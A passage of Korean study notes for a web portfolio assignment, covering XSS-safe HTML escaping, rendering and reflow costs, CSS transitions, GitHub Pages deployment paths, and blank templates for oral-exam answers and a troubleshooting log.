| ③ | 속성 값도 검사 — `href="javascript:..."` 차단, URL 스킴 확인 | 저장소 링크에 적용 |

```js
const escapeHtml = (str = '') =>
  String(str).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[ch]));

const toCard = ({ name, description, html_url }) => `
  <article class="card">
    <h3>${escapeHtml(name)}</h3>
    <p>${escapeHtml(description ?? '설명 없음')}</p>
    <a href="${encodeURI(html_url)}">보기</a>
  </article>`;
```

**요점**: 문자열을 만들 때가 아니라 **HTML에 넣는 그 지점에서** 이스케이프한다. 데이터는 원본 그대로 두고, 출력 순간에만 무해화하는 것이 원칙이다.

**✍️ 내가 채울 것**
- 이스케이프를 적용한 필드 목록:
- 안 한 필드가 있다면 안전하다고 판단한 근거:

---

### C-14. 브라우저 렌더링 파이프라인과 성능 → E-4.1

**화면이 그려지는 순서**

```
HTML ─파싱→ DOM ┐
                ├→ 렌더 트리 → 레이아웃(Layout) → 페인트(Paint) → 합성(Composite)
CSS  ─파싱→ CSSOM┘              "어디에 얼마나"      "무슨 색"      "겹쳐 올리기"
```

- **레이아웃(= 리플로우)** — 위치와 크기를 계산한다. **가장 비싸다.** 한 요소가 바뀌면 주변도 다시 계산될 수 있다
- **페인트** — 픽셀을 칠한다. `box-shadow`, `border-radius`가 여기 비용을 더한다
- **합성** — 이미 칠해진 레이어를 GPU가 배치한다. **가장 싸다**

**리플로우를 유발하는 것**

- 쓰기: `width`, `height`, `top`, `margin`, `display` 변경, DOM 추가/삭제
- **읽기**: `getBoundingClientRect()`, `offsetTop`, `scrollHeight` — 정확한 값을 위해 브라우저가 밀린 레이아웃을 **즉시** 계산한다(강제 동기 레이아웃). C-9에서 scroll 이벤트가 위험한 이유가 이것이다

**저장소 100개일 때의 병목** (E-4.1의 답)

| 문제 | 왜 | 개선 |
|---|---|---|
| 반복 `innerHTML +=` | 대입할 때마다 **전체를 다시 파싱하고 레이아웃**한다. 100번이면 100번 | `map(...).join('')`으로 문자열을 다 만든 뒤 **한 번만** 대입 ← 우리 설계가 이미 이렇다 |
| 노드를 하나씩 `appendChild` | 붙일 때마다 레이아웃 | `DocumentFragment`에 모아 한 번에 붙인다 |
| 이미지 100장 동시 요청 | 네트워크·메모리 | `<img loading="lazy">` |
| 100개를 전부 DOM에 유지 | 노드 수 자체가 비용 | 페이지네이션 / "더 보기" / 가상 스크롤 |

**애니메이션은 `transform`·`opacity`로** — 이 둘은 레이아웃과 페인트를 건너뛰고 합성만 한다. `top`이나 `width`를 애니메이션하면 매 프레임 레이아웃이 돈다. (→ C-15)

**측정**: DevTools Performance 탭에서 기록하면 Layout·Paint 구간이 보인다. 추측으로 최적화하지 않는다.

**✍️ 내가 채울 것**
- 내 렌더링 방식과 100개일 때 먼저 손볼 지점:

---

### C-15. transition과 시각 효과의 비용 → R-22, R-23

**`transition` 문법**

```css
.card {
  transition: transform 200ms ease-out, box-shadow 200ms ease-out;
}
.card:hover { transform: translateY(-4px); }
```

`속성 지속시간 타이밍함수 [지연]` 순서. 쉼표로 여러 개를 나열한다.

**⚠️ `transition: all`을 쓰지 않는다**

- 지금은 문제없어도 나중에 추가한 속성까지 **의도치 않게 애니메이션된다**
- 브라우저가 모든 속성을 감시해야 해 비용을 예측할 수 없다
- 애니메이션할 속성을 **명시하는 것 자체가 설계 의도의 표현**이다

**무엇을 애니메이션할 것인가** (C-14와 직결)

| 등급 | 속성 | 비용 |
|---|---|---|
| 좋음 | `transform`, `opacity` | 합성만. 60fps 유지 쉬움 |
| 보통 | `background-color`, `box-shadow`, `color` | 페인트 발생 |
| 피함 | `width`, `height`, `top`, `left`, `margin` | **레이아웃부터 다시** |

카드 hover는 `translateY` + `box-shadow` 조합이 전형적이다. `margin-top`으로 띄우면 주변 레이아웃이 통째로 밀린다.

**hover는 포인터 기기에만**

```css
@media (hover: hover) {
  .card:hover { transform: translateY(-4px); }
}
```

터치 기기에서는 탭한 뒤 hover 상태가 **눌린 채로 남는다.** 이 쿼리로 감싸면 그 문제가 없다.

**`box-shadow`** (R-23) — 깊이감을 주지만 페인트 비용이 있다. 그림자를 크게 흐리게(`blur`) 줄수록 비싸다. 여러 요소에 큰 그림자를 깔고 스크롤하면 체감된다.

**모션 민감성**

```css
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { transition-duration: 0.01ms !important; animation: none !important; }
}
```

**✍️ 내가 채울 것**
- 내가 애니메이션한 속성 목록:
- `transition: all`을 쓰지 않은 대신 명시한 속성:

---

### C-16. 정적 사이트 구조와 배포 → R-1~R-3, R-14, R-56~R-58 / E-1.6, E-2.1

**왜 HTML·CSS·JS를 파일로 나누는가** (R-1, R-2, R-14)

1. **관심사 분리** — 구조(HTML) / 표현(CSS) / 동작(JS). 고칠 곳을 찾는 시간이 줄어든다
2. **캐싱** — 브라우저는 파일 단위로 캐시한다. HTML만 바뀌었을 때 CSS·JS를 다시 받지 않는다. 한 파일에 몰아넣으면 한 글자만 고쳐도 전부 다시 받는다
3. **재사용** — 페이지가 늘어나면 같은 스타일시트를 공유한다

**`<link>`는 `<head>`, `<script>`는 `defer`**

- 스타일시트는 렌더링을 차단한다. 그게 **의도된 동작**이다 — 스타일 없는 화면이 먼저 보였다가 바뀌는 깜빡임(FOUC)을 막는다
- 스크립트는 반대로 차단하면 안 된다. `defer`로 파싱 후 실행 (→ C-3)

**Live Server가 필요한 진짜 이유** (R-3)

단순히 자동 새로고침 때문이 아니다. `file://`로 HTML을 직접 열면:

- `fetch`가 **CORS 정책에 막힌다** → GitHub API 호출(R-48)이 실패한다
- ES 모듈(`type="module"`)이 **로드되지 않는다** → 설계 결정 #1의 파일 분할이 동작하지 않는다

즉 이 과제는 **로컬 HTTP 서버 없이는 개발 자체가 불가능**하다.

**GitHub Pages**

- 빌드 과정 없이 **브랜치의 정적 파일을 그대로 서빙**한다. 소스는 `브랜치 + 경로`(루트 또는 `/docs`)로 지정한다
- 무료 계정은 **public 저장소**여야 한다
- push하면 자동 배포되지만 **반영까지 수십 초~수 분** 걸린다

**⚠️ 프로젝트 사이트는 하위 경로다**

```
https://codewhite7777.github.io/codyssey-b1-portfolio/
                                └─ 저장소 이름이 경로에 붙는다
```

| 경로 표기 | 로컬(Live Server) | 배포 |
|---|---|---|
| `href="/css/style.css"` | ✅ 동작 | ❌ **404** — 도메인 루트를 가리켜 저장소 경로를 벗어난다 |
| `href="css/style.css"` | ✅ | ✅ |

**모든 자산은 상대경로로 쓴다.** 로컬에서는 멀쩡하고 배포에서만 깨지는 유형이라 마감 직전에 발견되기 쉽다.

**캐시** — Pages는 CDN을 거친다. 배포했는데 예전 화면이 보이면 강력 새로고침(⌘⇧R)으로 먼저 확인한다.

**README** (R-58) — 평가자가 가장 먼저 보는 문서다. 설명·사용 기술·배포 URL·스크린샷에 더해 **임계값 3개(300px / 60px / 0.2)를 반드시 명시**한다. 원문이 "자유 변경 가능하나 README에 명시"라고 조건을 걸었기 때문에, 기본값을 썼더라도 적지 않으면 항목 누락이다.

**✍️ 내가 채울 것**
- 절대경로를 쓴 곳이 있는지 점검한 결과:
- README에 적은 임계값 3개:

---

## 3. 코드 해설

AI가 생성한 코드를 포함해 **모든 핵심 파일**을 내 말로 다시 설명한다.
주석의 WHAT/WHY를 베끼지 말고 흐름 단위로 재구성한다. (SPEC §4 — 설명 부채 금지)

### `index.html`

- **책임**:
- **구조 결정**: 어떤 기준으로 섹션을 나눴는가
- **담당 요구사항**: R-1 ~ R-13

### `css/style.css`

- **책임**:
- **변수 설계**: 어떤 축(색/간격/폰트)으로 나눴는가
- **레이아웃 전략**: 모바일 기본 → 768 → 1024에서 각각 무엇이 바뀌는가
- **담당 요구사항**: R-14 ~ R-23

### `js/*.js`

- **파일 분할 기준** (설계 결정 #1):
- **처리 흐름**:
  1. `defer`로 DOM 준비 후 실행 →
  2. 상태 초기화 →
  3. 이벤트 바인딩 →
  4. 상태 변경 시 렌더 함수 호출 →
- **이 파일이 깨지면 나타나는 증상**:
- **담당 요구사항**: R-24 ~ R-55

---

## 4. 구술 대비 Q&A (E)

`MISSION_SPEC.md` §6의 E-ID와 1:1. **말하듯이** 쓴다. 각 답변 30초 분량, 근거 → 결론 순서.
※ 평가지 미수령 상태의 **예측 문항**이다. 실제 평가지를 받으면 교체한다.

### 항목 2 — 구현 방법

- **E-2.1** 시맨틱 구조를 어떤 기준으로 나눴는가 →
- **E-2.2** nav=Flex / 카드=Grid를 택한 이유, auto-fit·minmax의 역할 →
- **E-2.3** data-theme + CSS 변수 방식으로 구현한 방법, 클래스 토글과 비교 →
- **E-2.4** 로딩/성공/에러/빈 4상태를 어떻게 분기했는가 →
- **E-2.5** 폼 검증을 input과 submit 중 언제 실행했고 왜 →

### 항목 3 — 개념 원리

- **E-3.1** 시맨틱 태그를 왜 쓰는가, alt·label for는 왜 필요한가 →
- **E-3.2** querySelector → addEventListener 흐름, preventDefault가 막는 것 →
- **E-3.3** 화살표 함수·구조분해·map이 왜 필요한가, map vs forEach →
- **E-3.4** async/await와 Promise의 관계, try/catch가 못 잡는 에러 →
- **E-3.5** 이벤트 → 상태 → DOM 흐름, React의 무엇에 해당하는가 →
- **E-3.6** localStorage 읽기/쓰기 시점, 테마 깜빡임 문제 →

### 항목 4 — 확장·응용

- **E-4.1** 저장소 100개면 병목은 어디이고 어떻게 개선하는가 →
- **E-4.2** innerHTML로 API 데이터를 렌더링할 때의 위험(XSS)과 대응 →
- **E-4.3** 레이트 리밋 403 발생 시 사용자 경험과 재호출 감소 방법 →
- **E-4.4** React로 옮기면 지금 코드의 무엇이 무엇으로 대체되는가 →
- **E-4.5** Intersection Observer 대신 scroll 이벤트를 썼다면 →
- **E-4.6** 다시 만든다면 무엇을 다르게 하겠는가 →

**꼬리질문 대비**: 위 답변 중 더 파고들면 나올 질문 →

---

## 5. 막힌 지점 로그

| # | 증상 | 원인 | 해결 | 배운 것 |
|---|---|---|---|---|
| 1 | | | | |

---

## 6. 다시 한다면

- 다르게 접근할 부분:
- 임시로 넘어간 것 / 근본 해결안:
- 실무라면 추가로 했을 것:
